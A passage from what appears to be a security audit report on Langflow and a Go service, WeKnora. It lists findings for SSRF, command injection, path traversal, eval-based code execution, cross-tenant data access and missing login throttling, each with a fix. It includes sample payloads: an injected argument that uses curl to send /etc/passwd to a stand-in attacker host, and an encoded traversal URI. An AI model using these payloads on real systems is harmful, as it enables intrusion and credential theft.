Path: the component requests DuckDuckGo HTML (line 70), parses each result's href (lines 84-91), extracts the `uddg` redirect target, unquotes it into decoded_link, passes it through ensure_url (line 94) which only applies the shape-only regex validate_url (lines 40-53), then fetches it with requests.get at line 95. The attacker controls decoded_link by controlling a page that appears in the results.
Why nothing stops it: validate_url only checks URL shape and accepts internal targets such as http://127.0.0.1/, http://localhost/, http://169.254.169.254/latest/meta-data/ and http://10.0.0.5/. There is no allow-list and no post-DNS-resolution block of loopback/link-local/private addresses anywhere in the repo (grep found no SSRF guard). requests follows redirects by default, so an external page can also redirect the fetch to an internal host. The query sanitizer (_sanitize_query) only strips <>"' from the search query and never touches the fetched URL.
Impact: the Langflow server performs GET requests to internal services or the cloud metadata endpoint and returns the response body to the caller in the DataFrame 'content' field, enabling internal-service reconnaissance and theft of IAM credentials from 169.254.169.254.
Fix: do not fetch URLs taken from scraped search results; or, before fetching, resolve the host and reject loopback, link-local (169.254.0.0/16), private (RFC1918), and other non-public ranges, enforce an allow-list of permitted schemes/hosts, and disable automatic redirect following (or re-validate the target after each redirect).

findings.title: Unauthenticated webhook endpoint lets anyone trigger unbounded flow runs
findings.description:
Entry: src/backend/base/langflow/api/v1/endpoints.py:390 (@router.post("/webhook/{flow_id_or_name}") -> webhook_run_flow), which calls background_tasks.add_task(simple_run_flow_task, ...) at endpoints.py:442.
Attacker: an unauthenticated external caller, crossing the boundary that otherwise protects flow execution — the /run and /run/advanced endpoints require a valid API key (api_key_security) or an authenticated user, but this webhook route has no auth dependency at all.
Path: the path parameter flow_id_or_name is resolved by get_flow_by_id_or_endpoint_name (helpers/flow.py:278) and get_user_by_flow_id_or_endpoint_name (helpers/user.py:11), which return the Flow and its owning User for any flow id or endpoint_name, with no check that the requester is authorized. The raw request body is read at line 417 (await request.body()), decoded at line 432 and injected as the tweak/input value into SimplifiedAPIRequest at lines 433-439, then handed to simple_run_flow_task at line 442, which calls simple_run_flow -> Graph.from_payload -> run_graph_internal -> graph.arun, i.e. full execution of the flow's components (LLM calls, HTTP requests, file/DB work, arbitrary installed integrations) in a background task.
Why nothing stops it: there is no Depends(api_key_security) or Depends(get_current_active_user) on the route, and no global auth dependency is added when the router is included (api/router.py:35 includes endpoints_router with no dependencies). The flow and user are looked up by identifier only, so an attacker does not need to be the owner. There is no cap on the request body, no cap on the number or size of webhook_components in the flow, no per-source rate limit, and no limit on how many background flow runs can be started concurrently.
Impact: any unauthenticated caller who knows or guesses a flow id or endpoint_name can drive arbitrary flows to execute on the server, and can issue many such requests to spawn unbounded concurrent, potentially long-running and resource-intensive background tasks — an amplification where a tiny request causes far more server work than the request itself, exhausting CPU, memory, worker connections and any downstream LLM/API quota. This is a denial-of-service on the whole Langflow instance.
Fix: require authentication/authorization on the webhook route (an API-key or per-flow webhook secret, checked with a constant-time comparison), verify the caller is permitted to trigger the flow, cap the accepted body size, and bound the number of concurrent webhook-triggered flow runs (e.g. a per-flow and per-source rate limit plus a bounded worker pool) so an unauthenticated caller cannot force unlimited execution.

findings.title: Authenticated user achieves RCE via MCP server config command injection
findings.description:
Entry: src/backend/base/langflow/api/v2/mcp.py:247 (POST /api/v2/mcp/servers/{server_name}) and :267 (PATCH), body parameter server_config.
Attacker: any authenticated (non-superuser) user of the Langflow instance, crossing the boundary from "may manage my own MCP server list" to "may run arbitrary OS commands as the Langflow server process".
Path: add_server/update_server_endpoint take the caller-supplied JSON dict unchanged and store it via update_server -> upload_server_config into the per-user _mcp_servers.json. The config is later executed by GET /api/v2/mcp/servers?action_count=true (mcp.py:133), which calls update_tools(server_name, server_list["mcpServers"][server_name]) in util.py:859. There mode is set to "Stdio" whenever the key "command" is present (util.py:876), command = server_config.get("command") and args = server_config.get("args", []) (util.py:877, 892), and they are concatenated with a plain join into full_command = " ".join([command, *args]) (util.py:894) before mcp_stdio_client.connect_to_server(full_command, env) (util.py:895). In MCPStdioClient._connect_to_server the whole string is embedded into server_params = StdioServerParameters(command="bash", args=["-c", f"exec {command_str} || echo 'Command failed with exit code $?' >&2"]) (util.py:571-575), i.e. it is handed verbatim to bash -c; on Windows it is equally interpolated into cmd /c at util.py:562-568.
Why nothing stops it: _validate_connection_params (util.py:359-372) only rejects an empty command and, if the string merely contains "npx", checks that node exists (_validate_node_installation, util.py:351-356). There is no allow-list of binaries, no argument-array execution, no metacharacter filtering anywhere on the path, and the value is stored and re-read without modification. `command` can simply be a legitimate binary such as `echo` with `args` = ["a; curl http://attacker/$(cat /etc/passwd)"] to obtain command execution with shell metacharacters, and `env` is also caller-controlled (util.py:893, passed to StdioServerParameters env at util.py:559), so the attacker can additionally inject arbitrary environment variables into the child process.
Impact: an ordinary logged-in user (or anyone holding a valid API key/JWT) achieves remote code execution as the Langflow backend user, which reads the database, secrets (Langflow secret key, DB credentials, API keys of other users) and pivots into the container/network. On Windows the same input reaches cmd /c.
Fix: do not build a shell string. Parse the caller's command/args and execute them with an argument array (e.g. subprocess/anyio exec with shell=False, or pass command and args separately to StdioServerParameters instead of a single `bash -c`/`cmd /c` string), and constrain the executable to an operator-controlled allow-list of MCP launch commands rather than accepting arbitrary binaries and shell metacharacters from the request body.

findings.title: Authenticated user can force Langflow backend to request internal URLs (SSRF)
findings.description:
Entry: src/backend/base/langflow/api/v2/mcp.py:247 (POST /api/v2/mcp/servers/{server_name}) / :267 (PATCH), body parameter server_config.
Attacker: any authenticated (non-superuser) user, crossing the boundary from "may register an MCP endpoint" to "may make the Langflow server issue requests to arbitrary hosts, including its internal network and cloud metadata services".
Path: the caller-supplied dict may contain a "url" key, which makes update_tools choose mode = "SSE" (util.py:876), url = server_config.get("url", "") (util.py:878) and call mcp_sse_client.connect_to_server(url, headers=headers) (util.py:899). In MCPSseClient._connect_to_server (util.py:738) the value is passed to validate_url (util.py:701), which only parses it and performs an httpx HEAD request to it (util.py:711), then to pre_check_redirect (util.py:725, an httpx HEAD with follow_redirects=False), and finally the URL is stored as connection params (util.py:759-764) and used to open the MCP SSE session.
Why nothing stops it: validate_url checks only that a scheme and netloc are present and that the HEAD request returns a non-error status (util.py:704-720). There is no block on loopback, link-local, private RFC1918 ranges, or the 169.254.169.254 metadata address, and there is no hostname allow-list. Because the attacker controls the URL, the Langflow server itself issues the HEAD requests and the SSE connection, so it reaches hosts the attacker cannot reach directly; the HEAD probe also doubles as a port/status oracle, and a redirect Location is followed via pre_check_redirect.
Impact: server-side request forgery from the Langflow backend — probing and reaching internal services, admin panels, databases over HTTP, and cloud instance-metadata endpoints whose responses can be reflected back through the MCP tool listing/error messages (mcp.py:141-180 returns the connection error text to the caller).
Fix: before any outbound request, resolve the host and reject loopback, link-local, private, and metadata addresses, enforce an operator-controlled allow-list of permitted MCP hosts if possible, disable automatic redirect following for user-supplied URLs (or re-validate the redirect target), and avoid returning raw connection errors from user-supplied URLs to the client.

findings.title: Authenticated user exhausts instance via unbounded MCP server checks
findings.description: Entry: src/backend/base/langflow/api/v2/mcp.py:112 (@router.get("/servers")) — the caller sends ?action_count=true. Attacker: any authenticated Langflow user, crossing the boundary from "one small HTTP request" into "unbounded server-side concurrent work and process/session allocation" (denial of service against the whole instance). Path: the request hits get_servers, which reads the caller's own _mcp_servers.json via get_server_list (line 123). Because action_count is truthy it skips the cheap name-only return at line 127 and builds one check_server task per entry in server_list["mcpServers"] (line 184) and awaits them all at once with asyncio.gather (line 185). Each check_server calls update_tools (line 133), which for Stdio mode runs mcp_stdio_client.connect_to_server(full_command, env) (base/mcp/util.py:895) spawning a `bash -c "exec <command>"` subprocess held open by an anyio.Event().wait() background task (base/mcp/util.py:434-464), and for SSE mode opens an HTTP HEAD plus a persistent sse_client session (base/mcp/util.py:899, 480-515). Nothing on the path stops it: the endpoint only requires CurrentActiveUser (api/utils.py:35) — no admin check, no per-user server cap, no rate limit (ContentSizeLimitMiddleware in middleware.py only caps body size, not request rate), and there is no asyncio.Semaphore anywhere in this path (grep confirms the only gather here is unbounded). The only bound is the 100MB config-file upload cap in upload_user_file (api/v2/files.py:102), but each server entry can be as small as {"url":"http://x"} (~20 bytes), so a single 100MB file can hold on the order of a million entries; one GET with action_count=true then schedules a million concurrent tasks and spawns/holds a million subprocesses or SSE sessions. Impact: memory, file-descriptor and process-table exhaustion and event-loop starvation that take down the API for every tenant on the instance. Fix: cap the number of servers processed per request and bound concurrency, e.g. reject configs with more than a small N servers, and run the checks through an asyncio.Semaphore (a handful at a time) or a worker queue instead of an unbounded asyncio.gather, with a per-user rate limit on this endpoint.

findings.title: Unauthenticated GET /auto_login returns a 1-year superuser JWT
findings.description:
Entry: src/backend/base/langflow/api/v1/login.py:80 (@router.get("/auto_login")).
Attacker: an unauthenticated network caller, crossing the authentication boundary into the superuser account.
Path: GET /api/v1/auto_login with no credentials -> auth_settings = get_settings_service().auth_settings; because AUTO_LOGIN defaults to True (services/settings/auth.py:30) the branch is entered and create_user_longterm_token(db) (services/auth/utils.py:308) mints a 365-day access JWT whose sub is the configured superuser, then the handler sets it in the access_token_lf cookie and returns it in the response body. No Depends(...) guard and no credentials are required anywhere on the route.
Why nothing stops it: the route is registered on login_router (api/router.py:41) with no router-level dependencies, and the AUTO_LOGIN default is True, so every deployment that does not explicitly set LANGFLOW_AUTO_LOGIN=false ships exposed — the classic insecure default (like debug on). The password/default-superuser reset logic in auth.py:68-79 even forces SUPERUSER/SUPERUSER_PASSWORD to the well-known defaults while AUTO_LOGIN is on.
Impact: an anonymous caller obtains a superuser access token valid for a year and can read/modify/delete every user's flows, folders, variables and API keys.
Fix: do not hand out a superuser token to unauthenticated callers; require an authenticated request or at minimum default AUTO_LOGIN to False and refuse /auto_login unless the operator explicitly opts in.

findings.title: Unlimited login attempts enable password brute-force and CPU exhaustion
findings.description:
Entry: src/backend/base/langflow/api/v1/login.py:23 (@router.post("/login")) -> login.py:31 await authenticate_user(form_data.username, form_data.password, db).
Attacker: an unauthenticated remote caller, crossing the login boundary that is supposed to require knowing the account password (there is no session, token or source restriction on this route).
Path: login.py:31 passes the attacker-supplied username/password straight to authenticate_user (services/auth/utils.py:407), which looks up the user by username (crud.py:14) and, for any existing username, runs verify_password -> auth_settings.pwd_context.verify(...) (utils.py:418, 261-263) with a bcrypt CryptContext (services/settings/auth.py:56). A wrong password simply returns None and login.py:73 raises 401.
Why nothing stops it: no throttle, lockout or attempt counter exists on this path or anywhere around it. There is no slowapi/limiter/rate-limit dependency in the backend, the v1 router (api/router.py:26-59) attaches no dependencies to the login router, the User model has no failed-attempt or locked field, and the app middleware (main.py:287-346) only enforces CORS, a 100MB body-size cap and query-string flattening — none of which limit how often /login can be called. Each attempt against a valid username therefore forces a full bcrypt verification with no cost to the attacker beyond the request itself.
Impact: an unauthenticated attacker can issue unlimited login requests, both brute-forcing the superuser/other account passwords (the default deployment ships a known default superuser password, services/settings/constants.py:2) and saturating the worker CPU with bcrypt computations, which blocks the async event loop and denies service to legitimate users.
Fix: add per-account and per-source attempt limiting with backoff and a temporary lockout after N failures, and/or a server-side rate limiter (e.g. slowapi) in front of /login; also equalize timing by performing a dummy hash when the username does not exist.

findings.title: Authenticated MCP user can read any other user's flow files by flow_id
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp.py:139 (handle_read_resource, reached via resources/read JSON-RPC on the authenticated /api/v1/mcp/sse session).
Attacker: an authenticated low-privileged user, crossing the boundary into another user's stored flow files (IDOR).
The URI argument comes straight from the MCP client. handle_read_resource urlparses it and takes `flow_id = path_parts[-2]` and `filename = unquote(path_parts[-1])` (mcp.py:155-156) with no ownership or tenant check, then calls `storage_service.get_file(flow_id=flow_id, file_name=filename)` (mcp.py:161). The local storage backend resolves the path as `data_dir / flow_id / file_name` (services/storage/local.py:58) and returns the bytes with no user scoping.
Nothing on the path stops it: the /sse route only authenticates (CurrentActiveMCPUser) and sets current_user_ctx (mcp.py:348-351), but handle_read_resource never reads current_user_ctx. Unlike handle_call_tool, which scopes by user via get_flow_snake_case(name, current_user.id, ...) (mcp.py:235), the resource read path has no user filter at all, and get_file has no owner check.
Impact: any authenticated MCP user who knows or guesses a flow UUID (trivially obtained from handle_list_resources/handle_list_tools, which enumerate all flows) can read the contents of files uploaded to any other user's flow, exfiltrating user data across accounts.
Fix: resolve the requested flow through an ownership-scoped query (e.g. select Flow where id == flow_id and user_id == current_user_ctx.get().id) before reading the file, or make the storage layer require the owning user and reject mismatches; return not-found rather than the file when the caller does not own the flow.

findings.title: Authenticated user can list every flow and file across all tenants
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp.py:96 (handle_list_resources) and src/backend/base/langflow/api/v1/mcp.py:176 (handle_list_tools), both reached via resources/list and tools/list on the authenticated /api/v1/mcp/sse session.
Attacker: an authenticated low-privileged user, crossing the boundary into other users' flow metadata and file listings (cross-tenant enumeration).
Both handlers run `flows = (await session.exec(select(Flow))).all()` (mcp.py:111 and mcp.py:182) with no user_id or tenant filter, then emit the flow id, flow name, description, and for list_resources also each file name under `storage_service.list_files(flow_id=str(flow.id))` (mcp.py:116).
Nothing stops it: the only guard on this path is authentication at the /sse route (CurrentActiveMCPUser), which establishes who the caller is but is never used to scope the query. The sibling handler handle_call_tool does scope by current_user.id (mcp.py:235), proving the user id is available here and simply not applied.
Impact: any authenticated user can enumerate every flow in the deployment across all accounts, including flow UUIDs and file names, which are the exact inputs needed to exploit the unguarded handle_read_resource; it is a direct cross-user data leak on its own.
Fix: filter both queries by the authenticated user (where Flow.user_id == current_user_ctx.get().id), and only list files for flows the caller owns; apply the same scoping the tool-call handler already uses.

findings.title: Authenticated MCP user reads arbitrary host files via path traversal
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp.py:139 (handle_read_resource, registered via @server.read_resource() and reachable over the /mcp/sse + /mcp/ POST transport by any API-key-authenticated MCP user).
Attacker: an authenticated MCP user (API key holder) crossing the boundary from "read files that belong to my flows" to "read any file on the server host", including files of other tenants and host secrets.
Path: the MCP client sends a read_resource request whose `uri` is fully attacker-controlled; handle_read_resource does `parsed_uri = urlparse(str(uri))`, `path_parts = [p for p in parsed_uri.path.split("/") if p]`, then `flow_id = path_parts[-2]` and `filename = unquote(path_parts[-1])` (line 156), and calls `storage_service.get_file(flow_id=flow_id, file_name=filename)` (line 161). LocalStorageService.get_file (src/backend/base/langflow/services/storage/local.py:58) does `file_path = self.data_dir / flow_id / file_name` and reads it.
Why nothing stops it: urlparse does not collapse `..` segments and only splits on `/`; unquote then decodes percent-encoding, so a URI such as `http://x/api/v1/files/x/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` yields flow_id="x" and filename="../../../etc/passwd", producing `<config_dir>/x/../../../etc/passwd`. There is no check that flow_id is a UUID, no check that filename contains no path separators, no `os.path.commonpath`/`resolve()` containment check, and no verification that the flow belongs to current_user. The only guard on the route is authentication (CurrentActiveMCPUser), which the attacker satisfies legitimately.
Impact: arbitrary file disclosure on the Langflow host with the server's privileges — database credentials, langflow config and secrets, other users' uploaded flow files, and any readable system file (e.g. /etc/passwd, ~/.aws/credentials).
Fix: after splitting, reject any flow_id or filename containing path separators or `..`, validate flow_id as a UUID, and resolve the final path and assert it is contained within `self.data_dir` (e.g. `Path(file_path).resolve().is_relative_to(Path(self.data_dir).resolve())`) before reading; better still, look the flow up for the current user and use only its id.</br>

findings.title: Unauthenticated MCP SSE endpoint auto-logs in as superuser
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp.py:347 (@router.get("/sse") -> handle_sse, whose only guard is the CurrentActiveMCPUser dependency at line 348).
Attacker: an unauthenticated caller on the network, crossing the login boundary to reach the superuser's account and flows.
Path: the route is registered without router-level auth (api/v1/__init__.py imports the bare router) and is enabled by default (mcp_server_enabled=True in services/settings/base.py:245, wired in main.py:365-368). The dependency CurrentActiveMCPUser resolves to get_current_active_user_mcp -> get_current_user_mcp (services/auth/utils.py:483-516). oauth2_login/api_key_query/api_key_header all use auto_error=False, so a request with no token and no key proceeds. At line 504 AUTO_LOGIN is checked, and lines 511-516 then call get_user_by_username(db, SUPERUSER) and return that user unconditionally. The comment at lines 482 and 500 states this function "always behaves as if skip_auth_auto_login is True", so the operator's LANGFLOW_SKIP_AUTH_AUTO_LOGIN gate is never consulted here.
Why nothing stops it: unlike the general api_key_security (utils.py:59-66) and ws_api_key_security (utils.py:104-111), which raise 403 AUTO_LOGIN_ERROR when skip_auth_auto_login is false, get_current_user_mcp has no such branch. There is no other guard on the MCP route, so a deployment that set LANGFLOW_SKIP_AUTH_AUTO_LOGIN=false specifically to require a valid API key still serves the superuser to anyone who connects.
Impact: an unauthenticated caller establishes an MCP session as the superuser and can invoke handle_list_tools/handle_call_tool, listing and executing every flow in the instance (and reading flow files via handle_read_resource) with the superuser's privileges, defeating the operator's explicit hardening setting.
Fix: in get_current_user_mcp, gate the AUTO_LOGIN username fallback on settings_service.auth_settings.skip_auth_auto_login exactly as api_key_security does, raising 403 (AUTO_LOGIN_ERROR) when it is false, so the MCP endpoints honor the same control as the rest of the API.

findings.title: RSS Reader rss_url lets server be coerced into fetching internal URLs (SSRF)
findings.description: Entry: src/backend/base/langflow/components/data/rss.py:39 (read_rss, fed by the rss_url input declared at lines 19-25). Attacker: an authenticated user who runs or drives a flow containing the RSS Reader, or untrusted text that an agent ingests and turns into a tool call, crossing from "controls a tool argument" to "makes the Langflow server issue a request to its own internal network / cloud metadata service". The rss_url input is a MessageTextInput with tool_mode=True, so the tool framework turns it into an LLM-facing argument schema (base/tools/component_tool.py:190-197 calling create_input_schema, io/schema.py:216-256, which creates a plain `str` field with no validation); when the tool is called, component.set(**kwargs) (component_tool.py:98 and :122) binds the attacker-supplied string to self.rss_url, which is passed unmodified to requests.get at line 39. Nothing on the path stops it: there is no scheme/host allow-list, no DNS-resolution check, and no blocking of localhost, 169.254.169.254, or RFC1918 ranges anywhere in the backend (grep for ssrf/allowlist/is_private/ip_address in src/backend/base/langflow finds no such guard on this path), and requests.get follows redirects by default, so an attacker-controlled public host can 302 the server to an internal address. The sibling arXiv component (components/arxiv/arxiv.py:118) explicitly validates parsed_url.scheme and parsed_url.hostname, proving the framework does not enforce this for you. Impact: the server can be coerced into reading cloud instance metadata (IAM credentials), internal admin APIs, or other services reachable only from inside the deployment, with the response body returned to the caller in the articles DataFrame. Fix: before the request, parse the URL and enforce that the scheme is http/https and that the host does not resolve to a loopback, link-local, private, or otherwise non-public address (resolve DNS and re-check on every hop), disable redirect-following or re-validate each redirect target, and/or restrict to an operator-configured allow-list of feed hosts; mirror the arXiv component's scheme+host validation.

findings.title: Authenticated user can force Langflow server to request arbitrary internal URLs (SSRF)
findings.description:
Entry: src/backend/base/langflow/api/v1/endpoints.py:674 (POST /api/v1/custom_component/update), reached from the frontend via src/frontend/src/controllers/API/queries/nodes/use-post-template-value.ts:39.
Attacker: an authenticated but unprivileged user (CurrentActiveUser only), crossing the boundary from a flow-editing session into the server's internal network.
Path: the request body supplies `template.base_url` and `field_value`; custom/utils.py:627-635 calls cc_instance.update_build_config; ollama_embeddings.py:66-69 passes self.base_url (set from the user template by component.py:982-1003 set_attributes) or build_config["base_url"]["value"] into self.get_model, which at line 79 does urljoin(base_url_value, "/api/tags") and at line 81 issues `await client.get(url)`.
Nothing stops it: there is no host allow-list, no post-DNS-resolution check and no block on localhost/169.254.169.254/private ranges anywhere in the request path or the repo (no SSRF guard middleware, no ip_address checks on this route). The URL is used verbatim.
Impact: a low-privilege user can make the Langflow server issue HTTP GETs to arbitrary internal hosts (cloud metadata endpoints such as 169.254.169.254, internal admin panels, other services on localhost/RFC1918), yielding blind SSRF — internal port scanning, service probing, and credential theft from metadata services.
Fix: before making the request, resolve the hostname and reject non-public addresses (loopback, link-local including 169.254.169.254, and private ranges), enforce an allow-list of permitted Ollama hosts, and re-validate after any redirect; do not follow redirects by default.

findings.title: Authenticated user runs arbitrary Python via eval of flow input options
findings.description: Entry: src/backend/base/langflow/api/v1/flows.py:146 (POST /api/v1/flows create_flow) accepts a FlowCreate whose `data` is arbitrary JSON, and src/backend/base/langflow/base/tools/run_flow.py:224 (RunFlowBaseComponent._get_tools) consumes it. Attacker: an authenticated Langflow user (any logged-in user who may create flows) crossing into the server's Python interpreter, executing arbitrary code in the backend process. Path: create_flow stores flow.data (validated only to contain "nodes" and "edges", src/backend/base/langflow/services/database/models/flow/model.py:149-166) -> RunFlowBaseComponent.get_required_data (run_flow.py:198) -> get_new_fields_from_graph -> get_new_fields (run_flow.py:155-175) reads vertex.data["node"]["template"][input_name] verbatim from the stored JSON and builds dotdict(field) -> _get_tools passes them as flow_mode_inputs (run_flow.py:230) -> ComponentToolkit.get_tools (component_tool.py:191-195) -> create_input_schema_from_dict (schema.py:259) -> at line 271 `field_type = eval(literal_string, {"Literal": Literal})` where literal_string = f"Literal{input_model.options}". Nothing stops it: FlowBase.validate_json only checks for the presence of the nodes/edges keys, no option-value validation exists anywhere on this path, and the value is interpolated directly into a source string evaluated with eval(). Impact: a user who can create a flow and reference it from a RunFlow/agent tool causes arbitrary Python to run inside the Langflow backend worker, i.e. remote code execution with the server's privileges (secret/DB access, lateral movement) — an escalation well beyond the normal flow-authoring capability. Fix: do not build source from data. Construct the Literal type programmatically, e.g. `field_type = Literal[tuple(input_model.options)]` after coercing/validating each option to a hashable primitive, or use `create_model` with a validated enum; never pass caller-supplied values into eval/exec.

findings.title: Any authenticated user can read another tenant's record via GET /tenants/:id
findings.description:
Entry: internal/router/router.go:295 (tenantRoutes.GET("/:id", handler.GetTenant)) -> internal/handler/tenant.go:106 GetTenant.
Attacker: any authenticated user of one workspace, crossing the tenant boundary to read another tenant's record.
Path: the path parameter :id is parsed with strconv.ParseUint at line 109 and passed straight to h.service.GetTenantByID(ctx, id) at line 116; the service (internal/application/service/tenant.go:83) only rejects id==0 and otherwise returns s.repo.GetTenantByID(ctx, id) with no tenant filter, and the handler never compares id to the caller's own tenant nor checks user.CanAccessAllTenants/EnableCrossTenantAccess.
Why nothing stops it: the only middleware on this route is the global Auth middleware, which merely requires a valid token and sets the caller's own tenant in context; unlike ListAllTenants (line 301) and SearchTenants (line 361) which both gate on user.CanAccessAllTenants and the config flag, GetTenant has no such check, and the repository lookup is by primary key alone.
Impact: horizontal privilege escalation / IDOR - a member of any workspace can enumerate tenant ids and read other organizations' tenant records (name, description, status, APIKey and other stored configuration).
Fix: after loading the tenant, reject unless id equals the caller's tenant id from context, or the caller is authorized for cross-tenant access (same user.CanAccessAllTenants && cfg.Tenant.EnableCrossTenantAccess check used by ListAllTenants/SearchTenants); otherwise return 403/404.

findings.title: Cross-tenant update via PUT /tenants/:id rotates victim tenant's API key
findings.description:
Entry: internal/router/router.go:296 (tenantRoutes.PUT("/:id", handler.UpdateTenant)) -> internal/handler/tenant.go:147 UpdateTenant.
Attacker: any authenticated user of one workspace, crossing the tenant boundary to modify another tenant's record (and rotate its API key).
Path: :id is parsed at line 152, the JSON body is bound into a full types.Tenant at line 160, the caller-controlled id overwrites the body id (tenantData.ID = id at line 168) and the whole struct is handed to h.service.UpdateTenant(ctx, &tenantData) at line 169; the service (internal/application/service/tenant.go:113) only checks tenant.ID != 0, then regenerates the API key when empty (line 122-125) and calls repo.UpdateTenant with no tenant scoping.
Why nothing stops it: no comparison of id against the caller's tenant from context, and no CanAccessAllTenants/EnableCrossTenantAccess gate; the bound body also lets the caller set arbitrary tenant fields (mass assignment) including APIKey, status and agent configuration. The global Auth middleware only proves the caller is logged in.
Impact: a user of any tenant can overwrite another tenant's settings and, by submitting an empty/absent APIKey, force regeneration of that tenant's API key (and via the body set the value outright), effectively taking over the victim tenant's API-key authentication and stored configuration.
Fix: enforce id == caller tenant id (or the cross-tenant permission check) before update, and never accept Tenant.ID/APIKey from the request body - load the record server-side and apply only the fields the caller is allowed to change.

findings.title: CORS policy allows every origin with credentials enabled
findings.description:
Entry: internal/router/router.go:57 (cors.New in NewRouter, applied to the whole gin engine before the Auth middleware).
Attacker: any website the victim visits, crossing the same-origin boundary into the WeKnora API origin.
Path: cors.Config is constructed with AllowOrigins: []string{"*"} (line 58) and AllowCredentials: true (line 62); gin-contrib/cors v1.7.5 normalizes a single "*" entry to AllowAllOrigins and emits Access-Control-Allow-Origin: * alongside Access-Control-Allow-Credentials: true for every response, including the authenticated /api/v1 routes registered after middleware.Auth.
Why nothing stops it: the value is hardcoded, not read from configuration, so every deployment ships the permissive policy unless the code is edited; nothing in the middleware chain narrows the origin before cors.New runs (it is the first r.Use call).
Impact: the API advertises a wildcard origin with credentials allowed. For this application the blast radius is limited because the client stores the token in localStorage and sends it as an Authorization header rather than as a cookie, and browsers reject the literal "*" ACAO on credentialed reads, so a cross-site page cannot actually read authenticated responses today. It remains a shipped misconfiguration that becomes directly exploitable the moment cookie-based session auth is added or a proxy reflects the origin.
Fix: replace AllowOrigins []string{"*"} with an explicit allow-list of trusted origins loaded from configuration (e.g. cfg.Server.AllowedOrigins), drop AllowCredentials if cookies are not used, and only reflect an origin when it is in the allow-list.

findings.title: Unlimited login attempts enable password brute force and bcrypt CPU exhaustion
findings.description:
Entry: internal/handler/auth.go:106 (AuthHandler.Login, route POST /api/v1/auth/login, listed in noAuthAPI at internal/middleware/auth.go:22).
Attacker: an unauthenticated remote caller, crossing the login boundary — no credentials are required to reach this endpoint, and no limit is placed on how many times they may try.
Path: Login handler (handler/auth.go:106) -> userService.Login (service/user.go:131) -> userRepo.GetUserByEmail then bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(req.Password)) at service/user.go:160. The failure branch returns "Invalid email or password" (line 162-167) and the request ends; there is no per-account or per-source counter, delay, lockout, or rate limiter anywhere on this path. A repository-wide search for RateLimit/Limiter/lockout/attempt/failed_attempts/throttle finds no throttling for this endpoint, and the Auth middleware deliberately exempts this path (auth.go:22). The binding tags (types/user.go:62-65) only enforce min=6 on the password with no max, but bcrypt truncates at 72 bytes, so the password length itself is not the amplifier — the amplifier is the unlimited number of attempts against a deliberately expensive hash.
Why nothing stops it: the only checks on the path are binding validation and the email lookup; neither bounds the number of requests. The endpoint is unauthenticated by design and no attempt counter, lockout, or throttle exists for the account or the source address, so a single caller can issue guesses as fast as the server will accept them.
Impact: each unauthenticated request consumes one bcrypt cost-10 verification (~50-100 ms of CPU on typical hardware) inside a Gin handler goroutine, so a modest number of concurrent callers can exhaust the worker pool and starve all other tenants' requests (denial of service), while the same unlimited loop lets an attacker brute-force any user's password offline-cost-free. Because the check is global to the login endpoint, every account is guessable and every request is attacker-amplified server work.
Fix: add a per-account and per-source attempt limiter to the login path (e.g. a rate limiter / exponential backoff or temporary lockout keyed on the email and the client IP, and a cap on concurrent bcrypt operations), and return a generic failure without performing the bcrypt compare once the limit is exceeded so unauthenticated callers cannot keep forcing the expensive hash.

findings.title: Any authenticated user can dump every tenant and its API key via GET /tenants
findings.description: Entry: internal/handler/tenant.go:248 (GET /api/v1/tenants, route registered in internal/router/router.go:298). Attacker: an ordinary authenticated user, crossing the tenant boundary to enumerate every tenant in the system.
